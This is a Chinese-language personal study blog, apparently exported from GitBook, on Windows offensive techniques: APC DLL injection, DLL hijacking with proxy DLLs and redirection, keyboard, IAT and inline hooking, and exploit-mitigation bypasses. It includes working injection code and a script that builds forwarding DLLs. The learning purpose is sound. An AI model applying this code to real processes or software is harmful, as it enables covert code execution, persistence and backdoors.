当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。 就是当前线程等待之后，回去执行其他的代码。 状态 即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。 通知 当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。 回调 与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。 阻塞和非阻塞 阻塞与非阻塞主要是程序（线程）等待消息通知时的状态角度来说的。阻塞和非阻塞关注的是程序在等待调用结果（消息，返回值）时的状态。 阻塞调用结果返回之前，线程会被挂起，得到结果才会返回，就像scanf等待输入一样。 非阻塞调用在不能立刻得到结果之前，该调用不会阻塞当前线程。 异步和阻塞的关系 同步/异步关注的是消息通知的机制 --------------------------> 机制 而阻塞/非阻塞关注的是线程等待消息通知时的状态。 --------------------------> 状态 核心函数 作用：利用这个函数向休眠的目标线程中的APC队列中插入一个函数，在线程恢复的时候，就可以执行到这个函数。 将用户模式 异步过程调用 (APC) 对象添加到指定线程的 APC 队列。 每个线程都有自己的 APC 队列。 应用程序通过调用 QueueUserAPC 函数将 APC 排队到线程。 调用线程在对 QueueUserAPC 的调用中指定 APC 函数的地址。 APC 的排队是线程调用 APC 函数的请求。 DWORD QueueUserAPC( [in] PAPCFUNC pfnAPC, // 指向指定线程执行等待操作时要调用的 APC 函数的指针 [in] HANDLE hThread, // 线程的句柄。 句柄必须具有 THREAD_SET_CONTEXT 访问权限 [in] ULONG_PTR dwData // 传递给 pfnAPC 参数指向的 APC 函数的单个值。 ); 返回一个整数值。失败返回0； 将上述解释放到实际运用中的作用。 DWORD QueueUserAPC( // 要执行函数的地址 [in] PAPCFUNC pfnAPC, // 指向指定线程执行等待操作时要调用的 APC 函数的指针 // 插入APC的线程句柄 [in] HANDLE hThread, // 线程的句柄。 句柄必须具有 THREAD_SET_CONTEXT 访问权限 // 传递给执行函数的参数 [in] ULONG_PTR dwData // 传递给 pfnAPC 参数指向的 APC 函数的单个值。 ); 所以这里可以将该方法当作进程注入的方法，或者是dll注入的方法。 dll注入方法：第一个参数 传loadlibrary的地址，第二个传递dll的路径。 实现代码 注入前提：得给一个注入的机会 必须是多线程环境下 注入的程序必须会调用那些同步对象 基本思路： 当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 利用QueueUserAPC()在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。 代码流程： 将注入dll的路径写到目标程序中，获得写入的地址。 获得loadlibrary的地址。 利用QueueUserAPC()将loadlibrary注入的目标进程中。 目标线程恢复执行，调用APC里的这个loadlibrary，在目标进程中挂载dll。 因为是要通过APC向线程中插入函数，所以需要获得进程中的线程，给每一个线程都插入一下，失败了就继续下一个，比直接定位要方便一些。 获取所有线程： BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) { // 申请空间 DWORD dwThreadIdListLength = 0; DWORD dwThreadIdListMaxCount = 2000; LPDWORD pThreadIdList = NULL; HANDLE hThreadSnap = INVALID_HANDLE_VALUE; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) { return FALSE; } RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 th32 = { 0 }; // 拍摄快照 hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID); if (hThreadSnap == INVALID_HANDLE_VALUE) { return FALSE; } // 结构的大小 th32.dwSize = sizeof(THREADENTRY32); //遍历所有THREADENTRY32结构, 按顺序填入数组 BOOL bRet = Thread32First(hThreadSnap, &th32); while (bRet) { if (th32.th32OwnerProcessID == th32ProcessID) { if (dwThreadIdListLength >= dwThreadIdListMaxCount) { break; } pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID; } bRet = Thread32Next(hThreadSnap, &th32); } *pThreadIdListLength = dwThreadIdListLength; *ppThreadIdList = pThreadIdList; return TRUE; } 注入过程 #include #include #include #include #include /* * 注意loadlibrary的参数模式和参数的形式，char还是unicode * 主要dll的绝对路径，不能用中文，同目录也要用绝对路径 */ #define notePID 23472 LPCWSTR dllpath = L\"C:\\\\Users\\\\rootkit\\\\Desktop\\\\messageboxDll.dll\"; //列出指定进程的所有线程, BOOL GetProcessThreadList(DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) { // 申请空间 DWORD dwThreadIdListLength = 0; DWORD dwThreadIdListMaxCount = 2000; LPDWORD pThreadIdList = NULL; HANDLE hThreadSnap = INVALID_HANDLE_VALUE; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) { return FALSE; } RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 th32 = { 0 }; // 拍摄快照, 通过第一个参数快照系统中的所有线程，指定进程的快照 hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, notePID); if (hThreadSnap == INVALID_HANDLE_VALUE) { return FALSE; } // 结构的大小 th32.dwSize = sizeof(THREADENTRY32); //遍历所有THREADENTRY32结构, 按顺序填入数组【有关系统快照中遇到的任何进程的第一个线程的信息。】 //函数返回的快照的句柄 , 指向 THREADENTRY32 结构的指针 BOOL bRet = Thread32First(hThreadSnap, &th32); while (bRet) { // 先检查当前线程是不是指定进程下的线程 if (th32.th32OwnerProcessID == notePID) { if (dwThreadIdListLength >= dwThreadIdListMaxCount) { break; } pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID; } // 遇到的任何进程的下一个线程的信息 bRet = Thread32Next(hThreadSnap, &th32); } *pThreadIdListLength = dwThreadIdListLength; *ppThreadIdList = pThreadIdList; return TRUE; } int main() { size_t dwsize = (_tcslen(dllpath) + 1) * sizeof(TCHAR); //size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR); // 获取目标进程的句柄，采用打开现有进程的形式 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); // 在目标进程中开辟内存空间，用来存放注入的dll的地址 LPVOID pRemotebuf = VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE); printf(\"[+] VirtualAlloc sucess addr = %p\\n\", pRemotebuf); // 向开辟出来的地址写入dll路径 WriteProcessMemory(hProcess, pRemotebuf, dllpath, dwsize, NULL); printf(\"[+] WriteProcessMemory sucess write dll path to target memroy \\n\"); /* * 获取loadlibrary的地址。两种方法 * 1、直接在本程序获得（在Windows中共享库的地址是一定的） * 2、利用PEB计算目标程序的kerneldll地址，复杂但是适合远程 */ HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); //HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMOD, \"LoadLibraryW\"); printf(\"[+] GetProcAddress sucess pthreadproc = %p\\n\", pThreadProc); /* 执行dll */ // 先获得目标进程中的所有线程 LPDWORD pThreadIdList = NULL; DWORD dwThread_ListLength = 0; GetProcessThreadList(&pThreadIdList, &dwThread_ListLength); // 遍历线程，得机会注入APC DWORD fail = 0; for (int i = dwThread_ListLength - 1; i >= 0; i--) { // 打开线程 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]); if (hThread) { // 插入APC, 因为有条件，所以这里不一定都会成功，所以要进行错误准备 if (!QueueUserAPC((PAPCFUNC)pThreadProc, hThread, (ULONG_PTR)pRemotebuf)) { fail++; } // 关闭线程句柄 CloseHandle(hThread); hThread = NULL; } } printf(\"Total Thread: %d\\n\", dwThread_ListLength); printf(\"Total Failed: %d\\n\", fail); if (fail >= dwThread_ListLength) { printf(\"Apc injection is failed\\n\"); } // 关闭句柄 CloseHandle(hProcess); return 0; } 结果：可以看到该dll已经成功加载到对应进程的内存中了，但是因为我写的dll里有太多的弹窗，可能会卡死，所以能不能弹出来看运气 5、其他 上述是常见的一些dll注入的方式，但是还有很多方式可以用来实现这个目的，只需要api可以满足调用loadlibrary和带一个参数就可以实现，比如RtlCreateUserThread 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-11 19:42:37 "},"MyArticles/CyberSec/DLL注入-突破session0.html":{"url":"MyArticles/CyberSec/DLL注入-突破session0.html","title":"DLL注入-突破session0","keywords":"","body":"没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-13 14:01:13 "},"MyArticles/CyberSec/dll劫持原理学习和应用.html":{"url":"MyArticles/CyberSec/dll劫持原理学习和应用.html","title":"dll劫持原理以及方式实践","keywords":"","body":"dll劫持技术是一种名字听起来很高级但是实际上原理很简单的一种技巧。 简介 在Windows系统中运行可执行文件时，系统会调用相应需要的.dll文件，系统的默认优先级规则是最优先调用是当前目录下的.dll链接库，寻找不到则去系统目录下寻找。或者程序会动态生成目录然后使用loadlibrary去动态调用。 如果程序没有使用SetDllDirectory()函数设定dll加载绝对路径，则程序很大可能性即存在dll劫持注入漏洞。 原理 根据dll加载的顺序来替换dll文件，并且将原dll文件的功能进行转发。 dll搜索顺序 dll的搜索顺序微软这几年一直在改，包括使用一些安全手段来改变搜索顺序。一般的顺序如下 应用程序加载的目录 系统目录，使用 GetSystemDirectory 获取该路径 16 位系统目录 Windows 目录，使用 GetWindowsDirectory 获取该路径 当前目录 PATH 环境变量中列出的目录 一、劫持思路： 同名dll替换策略，但是这里会出现无效的情况，原因就是： 当内存中已加载相同模块名称的 dll 时，系统将直接加载该 dll，不会进行搜索；除非设置了 dll 重定向选项 如果要加载的 dll 模块属于 Known DLLs，系统直接加载系统目录下的该 dll，不会进行搜索。 Known DLLs 列表：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 暗度陈仓 - 函数转发 要是想持久的运行恶意代码，就需要保证程序的正常运行，所以恶意的dll必须可以提供正常dll的功能，考虑到技术成本，对原功能进行重写不太现实，所以我们通过函数转发来实现。实现流程如下图所示： 一、函数较少 这种就可以直接仿照原dll的导出函数格式和参数通过LoadLibrary函数去调用原dll的导出函数。 二、函数过多 导出函数太多的话上述方式过于麻烦，通过定义def文件，把工作交给链接器去执行，微软给出的说明， .def文件是文本文件，其中包含一个或多个描述 DLL 的各种特性的模块语句。 如果没有使用 *__declspec(dllexport) 关键字来导出 DLL 的函数，则 DLL 需要 DEF 文件。 这里通过一个python代码来获得导出表 import os import time import pefile import sys # 实现了自动将dll中的导出函数自动整理到def文件中同时将原dll文件改名（old+） dll_name = \"msvcrt.dll\" os.rename(dll_name, \"old\"+dll_name) dll = pefile.PE(\"old\"+dll_name) count = 0 with open(dll_name.replace(\".dll\", \".def\"), \"a\", encoding='utf-8')as file: file.write('LIBRARY '+dll_name+'\\n'+'EXPORTS\\n') for export in dll.DIRECTORY_ENTRY_EXPORT.symbols: if export.name == None: print(\"no export name, ordinal is \"+str(export.ordinal)) line = str(export.ordinal) else: line = \"{}={}.{}\\t@{}\".format(export.name.decode(), dll_name, export.name.decode(), export.ordinal) count += 1 print(count, line) file.write(\"\\t\"+line+\"\\n\") print(\"finish\") # gcc -shared fake_peparser.c fake_peparser.def -o fake_peparser.dll -m32 1、def文件 def文件的基本格式如下 LIBRARY BTREE EXPORTS Insert @1 Delete @2 Member @3 Min @4 2、示例 以Pe Studio为例，他调用了一个peparser.dll的动态库，这个库中导出了两个函数，我们来劫持一下 首先构造一个假的dll，并且利用def方式连接上面的真的dll的导出函数 a. 构造fakedll fake_peparser.c #include #include BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD hPrevInstance, LPVOID lpReserved) { switch (hPrevInstance) { case DLL_PROCESS_ATTACH: MessageBox(NULL,TEXT(\"hello world\"),TEXT(\"Hello\"),NULL); break; case DLL_PROCESS_DETACH: MessageBox(NULL,TEXT(\"hello world\"),TEXT(\"DETACH\"),NULL); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; } return TRUE; } fake_peparser.def LIBRARY fake_peparser.dll EXPORTS create=oldpeparser.create @1 run=oldpeparser.run @2 通过命令：gcc -shared fake_peparser.c fake_peparser.def -o fake_peparser.dll -m32进行编译 最后得到fake_peparser.dll文件。通过ida观察他的导出表。看到成功导出了两个函数，但是在本dll中是无法访问的。 b. 实测 先改一下名，直接欺骗劫持 欺骗基本成功，但是影响到了程序的正常执行，调试发现他在fakedll中只写进去了字符串而不是程序 通过调试程序发现他并不是不会载入之前的dll 他也会调用到原先的dll，但是不知道为啥程序不能正常运行了。 他确实会调用之前的dll中的导出函数 在附加调试器的状态下他可以成功的打开原程序并运行，经过测试发现问题在def文件中。 成功测试： 3、解决问题 这是原先的会报错的def文件： LIBRARY fake_peparser.dll EXPORTS create=oldpeparser.create @1 run=oldpeparser.run @2 这是修改之后的可以成功运行的def文件： LIBRARY peparser.dll EXPORTS create=oldpeparser.create @1 run=oldpeparser.run @2 第一行发生了变化. LIBRARY [library][BASE=address] // 指定 DLL 的名称 这个名称和要劫持的名称对上就好了。 最后实验完记得改回来。 如果导出函数没有导出名称，只有导出序号，Gcc 和 Tcc 不支持按序号导出的函数转发，可以使用 VisualStdio 分类 dll劫持一般分为两类： 专属dll劫持 系统dll劫持 一、专属dll劫持 这个就是针对某一个程序进行的劫持行为，根据程序调用dll的方式去进行替换，和上面的测试案例差不多的思路 二、系统dll劫持 对一些Windows官方的dll进行劫持，这里需要重启之后才能生效。因为他们在开机的时候就已经载入内存中了，所以需要重启一下。这种劫持方式会导致所有的程序都会加载，适合进行沙箱或者是蜜罐的监控策略。 非常底层的ntdll之类的dll不能劫持，因为他本身实现了函数装载和转发的功能。 三、dll重定向 有些dll已经被系统或者是其他的程序加载到内存中了，这时候如果需要劫持某个特定程序的这个dll就需要用到重定向的方式，强制让他去执行你指定的dll。 但是一般的Windows系统都会关闭这个功能，在注册表中 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options 添加 DevOverrideEnable (DWORD) 字段并设置为 1，来开启该功能，重启后生效。但是我没有重启。 .local 首先需要在程序同目录下创建ProgramName.exe.local目录，然后将fakedll和原本的dll（方便转发）放进去。 这里使用普通程序中会载入的msvcrt.dll来进行测试。这里就需要用到目录了。需要将假的dll和真的dll都放在这个目录中，这就可以达到目的。 manifest 还可以使用 manifest 配置文件(xml文件)，优先级高于 .local。这个出现再flareon 的以此竞赛中，这个东西配置了一些pe文件的基础东西。所以我们可以从这个配置文件下手，这个东西可能是独立的文件，也可能是直接附加到pe文件的后面了。这里不需要新建目录，将所有的东西放到一个一个目录就可以。 这里需要构建的是两个manifest文件，分别是目标EXE文件和fakedll的。 msvcrt.dll.manifest DLL Redirection test.exe.manifest 最后在执行dll劫持的目录中应该是这样的 ├── test.c ├── oldmsvcrt.dll ├── msvcrt.dll ├── msvcrt.dll.manifest ├── test.exe └── test.exe.manifest 这样就达成目的了。 供应链dll劫持 dll劫持的方式可以施加到编译器的上面，通过修改编译器会使用的dll，来达到在通过这个编译器编译的程序中插入后门的目的，常见的一般有 TCC劫持 Gcc劫持 去劫持vs的编译器对安全检查比较困难，所以针对这些编译器下手比较方便。 参考 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-04 20:12:39 "},"MyArticles/CyberSec/r3-hook.html":{"url":"MyArticles/CyberSec/r3-hook.html","title":"Hook - R3","keywords":"","body":"Windows下的hook技术学习 hook分类 这张图非常经典，很多平台都能看到一模一样的分类。 根据《逆向工程核心原理》中的一个分类图： 这篇用来记录应用层hook，内核还没学😅 1、消息hook类型 原理 消息机制算得上Windows中的最常见的常用的机制之一，比如当键盘敲击事件发生，这个事件就被添加到系统的消息队列中，然后操作系统判断哪个程序发生了事件，然后把这个事件转移到对应程序的私有队列中，程序检测到自己的队列中有新增消息，就检查消息进行响应，就完了。 这种hook技术又称Windows hook，这种类型的hook情况，Windows给出了一个官方的API：SetWindowsHookEx。这个常常和dll注入配合使用。 Hook分为全局和局部，全局一般用来实现dll注入(因为每一个进程的地址都是独立的，如果不将hook函数作为一个独立的地址，那么执行起来将非常麻烦)，局部hook就是针对某一个线程进行hook。 HHOOK WINAPI SetWindowsHookEx( __in int idHook, \\\\钩子类型 __in HOOKPROC lpfn, \\\\回调函数地址，也就是自定义的消息处理函数 __in HINSTANCE hMod, \\\\实例句柄 __in DWORD dwThreadId); \\\\线程ID，设置为0则为全局钩子，会影响所有的进程 使用这个api之后，当任意进程中生成指定的消息的时候，os就会把这个dll载进去，然后调用hook，这都是os自动进行的。 键盘 Hook 代码 代码来自《逆向工程核心原理》，下面是keylogger.dll的代码，通过另一个载入程序执行这个dll，然后就可以敲击键盘记录了。 #include #include HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; #define DEF_PROCESS_NAME \"notepad.exe\" // 这个回调函数用来处理键盘输入 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { char szPath[MAX_PATH] = {0}; char* p = NULL; if(nCode >= 0) { if(!(lParam & 0x80000000)) { GetModuleFileNameA(NULL, szPath, MAX_PATH); // 取\\\\之后的字符，用来判断是不是目标进程notepad。 p = strrchr(szPath, '\\\\'); } } if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; // 不是就换下一个函数 return CallNextHookEx(g_hHook, nCode, wParam, lParam); } // 利用api启动挂钩 __declspec(dllexport) void StartHook() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } // 取消挂钩 __declspec(dllexport) void StopHook() { // 先检查一下第一步挂钩是否成功，是被就不用了 if(g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } } // 这里的dllmain实际上用不到, 写不写都无所谓了 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; } return TRUE; } 2、IAT Hook 这种方式主要是针对程序中的函数进行hook，而且是针对需要从外部调用的函数的进行HOOK。我认为与之对应的是inline hook。 IAT是导入地址表，对应的EAT导出地址表也可以被hook 原理 1、修改被hook函数的在IAT表中的地址，让他指向自定义的函数。偷梁换柱。 2、根据这个原理，思路就是：找到目标函数iat中的位置--->修改iat中的函数的原来的地址---->改成自定义函数的地址---->正常调用原来的函数。 3、可以使用外部dll进行hook，也可以使用程序自身内部代码实现iathook。 Walkthrough 得到 PE baseaddr 利用 e_lfanew 地址获得NT头 得到NT头找到可选头 可选头的IDD数组 数组第二项为导入表 根据偏移+基地址得到导入表 利用导入表里的name字段的值+基地址得到每个导入表的名称 导入表中的双桥结构 参考学习：导入表中的双桥结构 这个结构的主要的两个指针就是OriginalFirstThunk还有FirstThunk IID的结构如下: struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; //指向INT 桥1 } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; //dll名称 DWORD FirstThunk; //指向IAT 桥2 } IMAGE_IMPORT_DESCRIPTOR; OriginalFirstThunk 和 FirstThunk 他们都是两个类型为IMAGE_THUNK_DATA 的数组 OriginalFirstThunk: 双字最高位为0，导入符号是一个数值，该数值是一个RVA。 双字最高位为1，导入符号是一个名称 PE 装载器首先搜索 OriginalFirstThunk ，找到之后加载程序迭代搜索数组中的每个指针，找到每个 IMAGE_IMPORT_BY_NAME 结构所指向的输入函数的地址，然后加载器用函数真正入口地址来替代由 FirstThunk 数组中的一个入口，因此我们称为输入地址表（IAT）。 静态结构如下： 其实就可以看作一个指向的是INT，另一个指向的是IAT。 实现代码 其实代码的关键就是确定要hook的函数，然后遍历导入表，修改地址，调用原函数。 核心：利用OriginalFirstThunk和FirstThunk进行导入表的遍历。 #include #include #include #include #include // 定义MessageBoxA函数原型 typedef int (WINAPI* PrototypeMessageBox)(HWND, LPCSTR, LPCSTR, UINT); // 原始MessageBoxA函数的地址 PrototypeMessageBox originalMsgBox; // Hook函数 int hookedMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) { MessageBoxW(NULL, TEXT(\"Hooked sucess\"), TEXT(\"Title\"), 0); return originalMsgBox(hWnd, lpText, lpCaption, uType); } int main() { // 获取模块基地址 HMODULE module = GetModuleHandle(NULL); // 获取DOS头 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module; // 获取NT头 PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)module + dosHeader->e_lfanew); // 获取导入表目录 PIMAGE_DATA_DIRECTORY importDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; // 获取导入表入口 PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(importDir->VirtualAddress + (DWORD)module); // 遍历导入表 while (importDesc->Name) { // 获取DLL名称 LPCSTR dllName = (LPCSTR)importDesc->Name + (DWORD)module; // 程序在函数没用调用的时候就没用把对应的dll载入内存，这样强制载入，初始化iat表结束之后，才能进行后续的修改 HMODULE dllHandle = LoadLibraryA(dllName); if (dllHandle) { // 获取原始和修正后的IAT PIMAGE_THUNK_DATA originalIAT = (PIMAGE_THUNK_DATA)((BYTE*)module + importDesc->OriginalFirstThunk); PIMAGE_THUNK_DATA firstIAT = (PIMAGE_THUNK_DATA)((BYTE*)module + importDesc->FirstThunk); // 遍历IAT查找MessageBoxA while (originalIAT->u1.AddressOfData) { PIMAGE_IMPORT_BY_NAME funcInfo = (PIMAGE_IMPORT_BY_NAME)((BYTE*)module + originalIAT->u1.AddressOfData); if (strcmp(funcInfo->Name, \"MessageBoxA\") == 0) { // 保存原始地址 originalMsgBox = (PrototypeMessageBox)firstIAT->u1.Function; // 修改内存权限，方便后续写入 DWORD oldProtect; VirtualProtect(firstIAT, sizeof(PIMAGE_THUNK_DATA), PAGE_READWRITE, &oldProtect); // 写入Hook地址 firstIAT->u1.Function = (DWORD)hookedMessageBox; // 完成任务就直接退出循环 break; } originalIAT++; firstIAT++; } } importDesc++; } // 调用MessageBoxA originalMsgBox(NULL, \"Hello\", \"Original\", 0); return 0; } /*代码参考：https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking*/ ps: 这里发现不少的定位偏移都是可以直接使用宏来实现，之前的代码中我还在苦哈哈的手动算偏移，程序里全是++--，通过上面的代码学到了多去找找对应的宏，微软肯定不会适配这么不好的。 2.1、EAT hook 这个和上面的思路基本一模一样，区别有两个： 代码区别：更改使用IMAGE_DIRECTORY_ENTRY_EXPORT宏来定位导出表。 使用区别：导出表该一个程序的，作用一个程序；导出表hook，直接改dll的，影响使用该dll的所有程序。 3、inline hook 顾名思义，就是直接改程序里的指令。类似于直接patch程序，但是是动态的。通过直接修改内存中任意函数的代码，将其劫持至Hook API。同时，它比IAT Hook的适用范围更广，因为只要是内存中有的函数它都能Hook，而后者只能Hook IAT表里存在的函数（有些程序会动态加载函数）。 被hook的位置 在进行hook的时候，最重要的就是找对hook的准确的地址，这样可以保证hook之后程序还可以正常执行，不会因为堆栈问题退出。注意的是hook过程中修改代码的位置不在调用函数中，而是在被调用函数的前几行。 能产生控制流分支的指令常见的无非call、jmp家族、ret这些，call和ret都会对栈产生影响，所以就用jmp进行hook最方便了。 思路 思路很简单，inline hook是通过直接修改进程代码来实现的，所以如果不考了稳定性，可以在一个程序的任意一个地方做hook方式，跳转到指定的代码段。 问题 有一个难点，hook的地址怎么找，虽然她可以在任意被执行的地方进行hook，但是如果确定地址呢？一般来说两种情况。 自己hook自己 hook目标进程 hook自己的话，得到一些自定义的函数的地址是很方便的，其他位置的地址基本要靠偏移推测出来，所以实际上还是只能hook函数调用，无法任意地址修改。 hook目标进程，怎么找到对面的要修改jmp的地方的地址是大问题，一般操作都是针对win api进行的hook，对于对方自定义的函数调用hook实现比较困难，实在要hook只能人工介入手动分析算出偏移利用baseaddr进行计算从而进行hook。 应用场景 除了用在CTF出题中有些用，好像也没啥用了，想执行shellcode不如直接注入，而且操作其他进程也需要很多计算，自动化程度不高。 实现代码 使用jmp + 偏移地址的方式进行hook，去hook别的比较困难，这里就自己hook自己的方式，hook一个写好了但是没调用的函数，简单主要是。就32位的程序进hook，地址比较短。 这里需要注意的是，虽然jmp在汇编来看是jmp+dst_addr的格式，但是在实际字节码中，是jmp+offset-len的方式；第二个就是需要注意，0xeb和0xe9这两个的区别，虽然都是jmp指令，但是后面跟的地址不同。 0xE9 JMP 后面的四个字节是偏移 0xEB JMP 后面的二个字节是偏移 0xFF25 JMP 后面的四个字节是存放地址的地址 0xFF15 CALL 后面的四个字节是存放地址的地址 0xE8 CALL 后面的四个字节是地址 0x68 PUSH 后面的四个字节入栈 0x69 PUSH 后面的1个字节入栈 eb和e9这灵活搭配就行，可以先用eb这种目标地址短的方式跳到位置不那么紧张的地方，再用e9来实现跳转hook。 还有需要注意的是，如果使用vs2022，第二次调用函数会被内联进去，所以hook的成功之后根本执行不到那里，导致看起来失败。 注意修改权限，可执行代码一般没有写的权限。先添加写权限，修改完事再恢复。这里不一定要用WriteProcessMemory函数，直接用memcpy也行。 DWORD oldProtect; VirtualProtect(origin_func, 5, PAGE_EXECUTE_READWRITE, &oldProtect); WriteProcessMemory(GetCurrentProcess(), (LPVOID)(addr_origfunc), newcode, 2, NULL); VirtualProtect(origin_func, 5, oldProtect, &oldProtect); 4、热补丁 - HotFix HOOK 之前的方式需要修改程序然后再将程序修改回来，当进行全局Hook的时候，系统运行效率会受影响。而且，当一个线程尝试运行某段代码时，若另一个线程正在对该段代码进行“写”操作，这时就会程序冲突，最终引发一些错误。可以使用HotFix Hook（“热补丁”）方法弥补上述问题。 为啥叫热补丁，当目标进程不能停止的时候进行补丁操作的方式。这种方式并没有找到太多的解释和定义，他不是一种特定的技术，而是一类技术的概况，精细化到操作上可以按照如下理解： 差异 和inline hook 这是正常的调用一个api时候的汇编 看到在push上面还有很多空白的地方可以操作，inline hook的方式就是直接e9+目标地址，hot fix使用的方法是 eb+5先跳到最上面那个ret下面，然后再进行e9的inline hook操作。 原因 这种方式更加安全，因为他并没有更改任何有意义的程序代码。inline hook会占用5字节的空间，这就遮挡了push和mov指令；hotfix方式只占用了mov edi，edi这个无意义的指令。即使是hook失败了，程序还是可以正常执行，不受影响。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-28 17:34:43 "},"MyArticles/Vulnerability_Mining.html":{"url":"MyArticles/Vulnerability_Mining.html","title":"Vulnerability Mining","keywords":"","body":"经过我的实践发现，漏洞挖掘是网络安全中更重要的。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 19:54:54 "},"MyArticles/Vulnerability_Mining/iwant2pwn/firstPWN.html":{"url":"MyArticles/Vulnerability_Mining/iwant2pwn/firstPWN.html","title":"CTF - PWN 学习","keywords":"","body":"这是之前hellorootkit那个博客中存在的一个模块，但是因为自己懒得调格式和图片，就没有发出去，所以准备直接发到这里。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-20 12:22:20 "},"MyArticles/Vulnerability_Mining/Windows通用shellcode编写.html":{"url":"MyArticles/Vulnerability_Mining/Windows通用shellcode编写.html","title":"shellcode编写-地址定位","keywords":"","body":"问题 Windows下的shellcode中往往会用到大量的API函数，这些API来自各种的调用库，这时就涉及到了地址定位的问题。 一、程序保护 简单对比对比，至于每种保护怎么绕过，那之后再说，好久不打pwn了。 Windows GS 和canary一样，通过在栈上设置关键值来保护溢出。 异常处理SEH链也在栈上因此可以覆盖SEH链为jmp esp的地址，之后触发异常跳转到esp执行shellcode。 SafeSEH SafeSEH是在程序编译的时候，就将所有的异常处理函数进行注册。凡是执行过程中触发异常后，都要经过一个检验函数，检查SEH链指向的地址是否在注册的列表中。 可以有效防止GS中的修改SEH的方式。 DEP 堆和栈只有读写权限没有执行权限。linux上是利用ret2libc的方式绕过，Windows上通过执行VirtualProtect()将shellcode所在内存属性添加上可执行权限来绕过这个方式。 ASLR 地址空间布局随机化（ASLR）应运而上，ALSR即是让exe、dll的地址全都随机。有效防止了DEP的攻击方式，压根定位不到ROP。 堆喷射 对抗ASLR的方式是暴力把程序空间占满，全铺上shellcode，只要跳转地址没落在已有模块中，落在我们的空间中即可以执行了shellcode，但是这样做无法绕过DEP，这种将程序空间全部占满铺上shellcode的技术被称为堆喷射技术，堆喷射技术只能对抗ASLR，缺无法对抗ASLR+DEP的双重防护。 CFG 微软在Win 8.1 Update 3以及Win 10中启用了一种抵御内存泄露攻击的新机制，即Control Flow Guard(CFG)——控制流防护。 通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题。 简单的说，就是在程序间接跳转之前，会判断这个将要跳转的地址是否是合法的。 linux 利用peda插件的checksec可以查看程序开启的保护。 CANNARY 金丝雀保护，linux上最经典的栈溢出保护策略，类似于Windows下的GS保护。 canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串，但是这也成为了识别canary的关键标志。 